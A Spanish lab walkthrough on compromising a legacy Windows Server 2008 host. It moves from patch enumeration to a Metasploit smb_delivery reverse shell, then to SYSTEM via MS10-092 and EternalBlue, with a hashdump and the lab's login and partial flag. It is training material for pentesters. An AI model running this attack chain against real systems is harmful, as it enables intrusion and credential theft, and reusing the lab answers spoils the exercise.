
# Windows Server

Windows Server 2008/2008 R2 llegó al final de su vida útil el 14 de enero de 2020. Con el paso de los años, Microsoft ha agregado funciones de seguridad mejoradas a las versiones posteriores de Windows Server. No es muy común encontrar Server 2008 durante una prueba de penetración externa, pero a menudo lo encuentro durante evaluaciones internas.

***

## Comparación entre Server 2008 y versiones más nuevas

La siguiente tabla muestra algunas diferencias notables entre Server 2008 y las últimas versiones de Windows Server.

| Feature                                                                                                                                                             | Server 2008 R2 | Server 2012 R2 | Server 2016 | Server 2019 |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------- | -------------- | ----------- | ----------- |
| [Enhanced Windows Defender Advanced Threat Protection (ATP)](https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection) |                |                |             | X           |
| [Just Enough Administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1)                                 | Partial        | Partial        | X           | X           |
| [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)                                         |                |                | X           | X           |
| [Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)                                            |                |                | X           | X           |
| [Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)       |                |                | X           | X           |
| [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)                  | Partial        | X              | X           | X           |
| [Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)                                                                                  | Partial        | Partial        | X           | X           |
| [Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)                                                                       |                |                | X           | X           |

***

## <mark style="color:purple;">Windows Server 2008</mark>

A menudo, durante mis evaluaciones, me encuentro con versiones antiguas de sistemas operativos, tanto Windows como Linux. A veces, se trata simplemente de sistemas olvidados sobre los que el cliente puede actuar rápidamente y desmantelar, mientras que otras veces, pueden ser sistemas críticos que no se pueden eliminar o reemplazar fácilmente. Los pentesters deben comprender el negocio principal del cliente y mantener conversaciones durante la evaluación, especialmente cuando se trata de escaneo/enumeración y ataques a sistemas antiguos, y durante la fase de informe. No todos los entornos son iguales y debemos tener en cuenta muchos factores al escribir recomendaciones para los hallazgos y asignar calificaciones de riesgo.&#x20;

Por ejemplo, los entornos médicos pueden estar ejecutando software de misión crítica en sistemas Windows XP/7 o Windows Server 2003/2008. Sin comprender el razonamiento "por qué", no es suficiente simplemente decirles que eliminen los sistemas del entorno. Si están ejecutando un software de resonancia magnética costoso que el proveedor ya no admite, podría costar grandes sumas de dinero realizar la transición a nuevos sistemas. En este caso, tendríamos que analizar otros controles de mitigación que tenga implementados el cliente, como segmentación de red, soporte extendido personalizado de Microsoft, etc.

Si estamos evaluando a un cliente con las mejores y más recientes protecciones y encontramos un host Server 2008 que no se incluyó, entonces puede ser tan simple como recomendar una actualización o desmantelamiento. Esto también podría suceder en entornos sujetos a estrictos requisitos de auditoría o regulatorios donde un sistema heredado podría generarles una calificación de "reprobado" o baja en su auditoría e incluso retrasarlos u obligarlos a perder la financiación gubernamental.

Echemos un vistazo a un host de Windows Server 2008 que podemos encontrar en un entorno médico, una gran universidad o una oficina del gobierno local, entre otros.

En el caso de sistemas operativos más antiguos, como Windows Server 2008, podemos utilizar un script de enumeración como [Sherlock](https://github.com/rasta-mouse/Sherlock) para buscar parches faltantes. También podemos utilizar algo como [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) , que toma los resultados del comando `systeminfo` como entrada y compara el nivel de parche del host con la base de datos de vulnerabilidades de Microsoft para detectar posibles parches faltantes en el objetivo. Si existe un exploit en Metasploit para el parche faltante en cuestión, la herramienta lo sugerirá. Otros scripts de enumeración pueden ayudarnos con esto, o incluso podemos enumerar el nivel de parche manualmente y realizar nuestra propia investigación. Esto puede ser necesario si existen limitaciones para cargar herramientas en el host de destino o guardar la salida del comando.

### **Consulta del nivel de parche actual**

Primero usemos WMI para verificar si hay KB faltantes.

```cmd-session
C:\htb> wmic qfe

Caption                                     CSName      Description  FixComments  HotFixID   InstallDate  InstalledBy               InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=2533552  WINLPE-2K8  Update                    KB2533552               WINLPE-2K8\Administrator  3/31/2021
```

Una búsqueda rápida en Google de la última revisión instalada nos muestra que este sistema está muy desactualizado.

### **Sherlock corriendo**

Ejecutemos Sherlock para recopilar más información:

```powershell
PS C:\htb> Set-ExecutionPolicy bypass -Scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y


PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/thttps://us-cert.cisa.gov/ncas/alerts/aa20-133aree/master/MS16-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```

### **Obtención de un shell Meterpreter**

En el resultado, podemos ver que faltan varios parches. A partir de aquí, vamos a obtener un shell de Metasploit en el sistema e intentar escalar privilegios utilizando uno de los CVE identificados. Primero, necesitamos obtener un reverse shell de `Meterpreter`. Podemos hacer esto de varias maneras, pero una forma fácil es utilizando el módulo `smb_delivery`.

```bash
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery

Matching Modules
================
   #  Name                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   0  exploit/windows/smb/smb_delivery  2016-07-26       excellent  No     SMB Delivery
Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/smb_delivery


msf6 exploit(windows/smb/smb_delivery) > use 0

[*] Using configured payload windows/meterpreter/reverse_tcp


msf6 exploit(windows/smb/smb_delivery) > show options 

Module options (exploit/windows/smb/smb_delivery):
   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_NAME    test.dll         no        DLL file name
   FOLDER_NAME                   no        Folder name to share (Default none)
   SHARE                         no        Share (Default Random)
   SRVHOST      10.10.14.3       yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      445              yes       The local port to listen on.
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   1   PSH


msf6 exploit(windows/smb/smb_delivery) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   DLL
   1   PSH


msf6 exploit(windows/smb/smb_delivery) > set target 0

target => 0


msf6 exploit(windows/smb/smb_delivery) > exploit 
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Started service listener on 10.10.14.3:445 
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

### **Comando Rundll en el host de destino**

Abra una consola cmd en el host de destino y pegue el comando `rundll32.exe`:

```cmd-session
C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

### **Recibiendo el Reverse Shell**

```shell-session
msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400
```

### **En busca de un exploit de escalada de privilegios locales**

Desde aquí, busquemos el módulo [de escalada de privilegios '.XML' del Programador de tareas de Windows MS10\_092](https://www.exploit-db.com/exploits/19930) .

```bash
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338

Matching Modules
================
   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation
   
   
msf6 exploit(windows/smb/smb_delivery) use 0
```

### **Migración a un proceso de 64 bits**

Antes de utilizar el módulo en cuestión, debemos ingresar a nuestro shell de Meterpreter y migrar a un proceso de 64 bits, o el exploit no funcionará. También podríamos haber elegido un payload de Meterpeter x64 durante el paso `smb_delivery`.

```powershell
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1

[*] Starting interaction with 1...

meterpreter > getpid

Current pid: 2268


meterpreter > ps

Process List
============
 PID   PPID  Name               Arch  Session  User                    Path
 ---   ----  ----               ----  -------  ----                    ----
 0     0     [System Process]
 4     0     System
 164   1800  VMwareUser.exe     x86   2        WINLPE-2K8\htb-student  C:\Program Files (x86)\VMware\VMware Tools\VMwareUser.exe
 244   2032  winlogon.exe
 260   4     smss.exe
 288   476   svchost.exe
 332   324   csrss.exe
 376   324   wininit.exe
 476   376   services.exe
 492   376   lsass.exe
 500   376   lsm.exe
 584   476   mscorsvw.exe
 600   476   svchost.exe
 616   476   msdtc.exe
 676   476   svchost.exe
 744   476   taskhost.exe       x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\taskhost.exe
 756   1800  VMwareTray.exe     x86   2        WINLPE-2K8\htb-student  C:\Program Files (x86)\VMware\VMware Tools\VMwareTray.exe
 764   476   svchost.exe
 800   476   svchost.exe
 844   476   svchost.exe
 900   476   svchost.exe
 940   476   svchost.exe
 976   476   spoolsv.exe
 1012  476   sppsvc.exe
 1048  476   svchost.exe
 1112  476   VMwareService.exe
 1260  2460  powershell.exe     x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1408  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 1464  900   dwm.exe            x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\dwm.exe
 1632  476   svchost.exe
 1672  600   WmiPrvSE.exe
 2140  2460  cmd.exe            x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\cmd.exe
 2256  600   WmiPrvSE.exe
 2264  476   mscorsvw.exe
 2268  2628  rundll32.exe       x86   2        WINLPE-2K8\htb-student  C:\Windows\SysWOW64\rundll32.exe
 2460  2656  explorer.exe       x64   2        WINLPE-2K8\htb-student  C:\Windows\explorer.exe
 2632  2032  csrss.exe
 2796  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 2876  476   svchost.exe
 3048  476   svchost.exe
 
 
meterpreter > migrate 2796

[*] Migrating from 2268 to 2796...
[*] Migration completed successfully.


meterpreter > background

[*] Backgrounding session 1...
```

### **Configuración de las opciones del módulo de escalada de privilegios**

Una vez configurado esto, podemos configurar el módulo de escalada de privilegios especificando nuestra sesión actual de Meterpreter, configurando nuestra IP tun0 para LHOST y un puerto de nuestra elección.

```bash
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
SESSION => 1


msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3
lhost => 10.10.14.3


msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443
lport => 4443


msf6 exploit(windows/local/ms10_092_schelevator) > show options

Module options (exploit/windows/local/ms10_092_schelevator):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION   1                yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4443             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008
```

### **Recibir el Meterpreter como SYSTEM**

Si todo va según lo previsto, una vez que lo ejecutemos, recibiremos un shell de Meterpreter como `NT AUTHORITY\SYSTEM` y podremos continuar para realizar cualquier post-explotación necesaria.

```bash
msf6 exploit(windows/local/ms10_092_schelevator) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4443
[*] Preparing payload at C:\Windows\TEMP\uQEcovJYYHhC.exe
[*] Creating task: isqR4gw3RlxnplB
[*] SUCCESS: The scheduled task "isqR4gw3RlxnplB" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\isqR4gw3RlxnplB...
[*] Original CRC32: 0x89b06d1a
[*] Final CRC32: 0x89b06d1a
[*] Writing our modified content back...
[*] Validating task: isqR4gw3RlxnplB
[*]
[*] Folder: \
[*] TaskName                                 Next Run Time          Status
[*] ======================================== ====================== ===============
[*] isqR4gw3RlxnplB                          6/1/2021 1:04:00 PM    Ready
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "isqR4gw3RlxnplB" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "isqR4gw3RlxnplB" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (175174 bytes) to 10.129.43.15
[*] SUCCESS: Attempted to run the scheduled task "isqR4gw3RlxnplB".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.3:4443 -> 10.129.43.15:49634) at 2021-05-12 16:04:34 -0400
[*] SUCCESS: The scheduled task "isqR4gw3RlxnplB" was successfully deleted.
[*] SCHELEVATOR


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM


meterpreter > sysinfo

Computer        : WINLPE-2K8
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
```

***

## <mark style="color:purple;">Caso práctico</mark>

### Atacando un Windows Server 2008

Tomando los ejemplos de enumeración que hemos visto en este módulo, acceda al sistema que se muestra a continuación, busque una forma de escalar al nivel de acceso `NT AUTHORITY\SYSTEM` (puede haber más de una forma) y envíe el archivo `flag.txt` en el escritorio del Administrador. Desafíese a escalar privilegios de múltiples formas y no se limite a reproducir la escalada de privilegios del Programador de tareas que se detalla anteriormente.

```
Objetivo: 10.129.43.43 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "htb-student" y contraseña "HTB_@cademy_stdnt!"
```

```bash
rdesktop -u htb-student -p HTB_@cademy_stdnt! 10.129.18.188
```

#### Sherlock para enumerar vulnerabilidades

Encontramos multitud de parches faltantes:

<figure><img src="/files/dXKt6NPeJmhpyB3xowbc" alt=""><figcaption></figcaption></figure>

#### Explotación con Web Delivery

```bash
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery

Matching Modules
================
   #  Name                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   0  exploit/windows/smb/smb_delivery  2016-07-26       excellent  No     SMB Delivery
Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/smb_delivery


msf6 exploit(windows/smb/smb_delivery) > use 0

[*] Using configured payload windows/meterpreter/reverse_tcp


msf6 exploit(windows/smb/smb_delivery) > show options 

Module options (exploit/windows/smb/smb_delivery):
   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_NAME    test.dll         no        DLL file name
   FOLDER_NAME                   no        Folder name to share (Default none)
   SHARE                         no        Share (Default Random)
   SRVHOST      10.10.14.3       yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      445              yes       The local port to listen on.
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   1   PSH


msf6 exploit(windows/smb/smb_delivery) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   DLL
    1   PSH


msf6 exploit(windows/smb/smb_delivery) > set srvhost 10.10.14.179
srvhost => 10.10.14.179
msf6 exploit(windows/smb/smb_delivery) > set lhost tun0
lhost => 10.10.14.179
msf6 exploit(windows/smb/smb_delivery) > set target 0
target => 0
msf6 exploit(windows/smb/smb_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.179:4444 
[*] Server is running. Listening on 10.10.14.179:445
[*] Server started.
[*] Run the following command on the target machine:
msf6 exploit(windows/smb/smb_delivery) > rundll32.exe \\10.10.14.179\isJO\test.dll,0
```

#### Ejecución del comando en el objetivo

```powershell
PS C:\Users\htb-student> rundll32.exe \\10.10.14.179\isJO\test.dll,0
```

#### Recibiendo el Meterpreter

```bash
[*] Run the following command on the target machine:
msf6 exploit(windows/smb/smb_delivery) > rundll32.exe \\10.10.14.179\isJO\test.dll,0
[SMB] NTLMv2-SSP Client     : 10.129.18.188
[SMB] NTLMv2-SSP Username   : WINLPE-2K8\htb-student
[SMB] NTLMv2-SSP Hash       : htb-student::WINLPE-2K8:f3a5480203e865e3:fcc6f59c285630424c7fcc5cd654b2ed:01010000000000008022b52d5fa2db017f1eb81c082674f0000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f0055005000070008008022b52d5fa2db0106000400020000000800300030000000000000000000000000200000857a138f6255e884e78deeb425e5c326c427249d548375610fad5d4469524a9b0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310037003900000000000000000000000000

[*] Sending stage (177734 bytes) to 10.129.18.188
[*] Meterpreter session 1 opened (10.10.14.179:4444 -> 10.129.18.188:49159) at 2025-03-31 19:06:06 +0200
```

Tenemos unsa sesión de Meterpreter en el background:

```bash
msf6 exploit(windows/smb/smb_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x86/windows  WINLPE-2K8\htb-student @ WINLPE-2K8  10.10.14.179:4444 -> 10.129.18.188:49159 (10.129.18.188)
```

#### Migración a un proceso de 64 bits

```bash
msf6 exploit(windows/smb/smb_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: WINLPE-2K8\htb-student
```

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                    Path
 ---   ----  ----                     ----  -------  ----                    ----
 0     0     [System Process]
 4     0     System
 252   492   svchost.exe
 268   4     smss.exe
 352   344   csrss.exe
 392   344   wininit.exe
 400   384   csrss.exe
 448   384   winlogon.exe
 492   392   services.exe
 504   392   lsass.exe
 512   392   lsm.exe
 608   492   svchost.exe
 684   492   svchost.exe
 756   448   LogonUI.exe
 768   492   svchost.exe
 808   492   svchost.exe
 832   492   spoolsv.exe
 848   492   msdtc.exe
 868   492   svchost.exe
 880   492   taskhost.exe             x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\taskhost.exe
 904   1280  conhost.exe              x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 920   492   svchost.exe
 968   492   svchost.exe
 1092  492   svchost.exe
 1164  492   VGAuthService.exe
 1180  352   conhost.exe
 1204  492   vmtoolsd.exe
 1232  492   ManagementAgentHost.exe
 1244  2604  powershell.exe           x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1280  1488  csrss.exe
 1480  492   svchost.exe
 1564  1488  winlogon.exe
 1580  492   svchost.exe
 1632  2660  powershell.exe           x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1772  1280  conhost.exe              x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 1796  608   WmiPrvSE.exe
 1892  1480  rdpclip.exe              x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\rdpclip.exe
 1944  492   dllhost.exe
 2044  1280  conhost.exe              x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 2060  2604  powershell.exe           x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2224  2660  vmtoolsd.exe             x64   2        WINLPE-2K8\htb-student  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2604  2584  rundll32.exe             x86   2        WINLPE-2K8\htb-student  C:\Windows\SysWOW64\rundll32.exe
 2636  920   dwm.exe                  x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\dwm.exe
 2660  2528  explorer.exe             x64   2        WINLPE-2K8\htb-student  C:\Windows\explorer.exe
 2900  492   sppsvc.exe
 2936  492   svchost.exe
 3060  2936  MpCmdRun.exe

meterpreter > migrate 2044
[*] Migrating from 2604 to 2044...
[*] Migration completed successfully.

meterpreter > bg
[*] Backgrounding session 1...
```

#### Exploit Suggester

Con la sesión abierta vamos a buscar exploits efectivos:

```bash
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 10.129.18.188 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.

[*] 10.129.18.188 - Valid modules for session 1:
============================
#   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 7   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
 9   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
```

#### Escalada de privilegios

Después de probar algunos de estos módulos no tenemos una explotación exitosa. Como tenemos un Windows Server antiguo vamos a lo clásico, el Eternal Blue:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.179:4422 
[*] 10.129.18.188:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.18.188:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7600 x64 (64-bit)
[*] 10.129.18.188:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.18.188:445 - The target is vulnerable.
[*] 10.129.18.188:445 - Connecting to target for exploitation.
[+] 10.129.18.188:445 - Connection established for exploitation.
[+] 10.129.18.188:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.18.188:445 - CORE raw buffer dump (36 bytes)
[*] 10.129.18.188:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.129.18.188:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 10.129.18.188:445 - 0x00000020  37 36 30 30                                      7600            
[+] 10.129.18.188:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.18.188:445 - Trying exploit with 17 Groom Allocations.
[*] 10.129.18.188:445 - Sending all but last fragment of exploit packet
[*] 10.129.18.188:445 - Starting non-paged pool grooming
[+] 10.129.18.188:445 - Sending SMBv2 buffers
[+] 10.129.18.188:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.18.188:445 - Sending final SMBv2 buffers.
[*] 10.129.18.188:445 - Sending last fragment of exploit packet!
[*] 10.129.18.188:445 - Receiving response from exploit packet
[+] 10.129.18.188:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.18.188:445 - Sending egg to corrupted connection.
[*] 10.129.18.188:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.129.18.188
[*] Meterpreter session 4 opened (10.10.14.179:4422 -> 10.129.18.188:49163) at 2025-03-31 19:42:16 +0200
[+] 10.129.18.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.18.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.18.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Tenemos una shell SYSTEM! Podríamos por ejemplo hacer un hashdump para volcar todos los hashes de los usuarios del sistema:

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1000:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
```

#### Acceso a la flag

```bash
meterpreter > cd C:/Users/Administrator/Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2021-03-26 03:23:16 +0100  desktop.ini
100666/rw-rw-rw-  24    fil   2021-06-05 03:12:50 +0200  flag.txt

meterpreter > cat flag.txt 
L3gacy_st1ill_***********
```
